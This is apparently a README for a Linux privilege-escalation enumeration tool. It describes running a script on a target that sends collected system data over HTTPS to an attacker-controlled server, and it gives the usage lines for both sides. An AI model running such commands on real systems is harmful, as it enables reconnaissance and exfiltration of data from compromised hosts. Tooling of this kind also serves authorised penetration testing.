# gx-privesc.sh
Privesc enumeration tool

This tool runs the initial enumeration commands on the target and send the data back to your machine over HTTPS (443/tcp). You will find the output under https directory in your working directory (The file is only readable by root)

Please don't forget to give execute permission to the scripts.

## Usage

### Enum script (run locally on the target)
```
./gx-lx-enum.sh YOUR_SERVER_IP 
```
### Command to receive the file from the Enum script (on the attacker machine)
```
./gx-lx-enum_server.sh
```
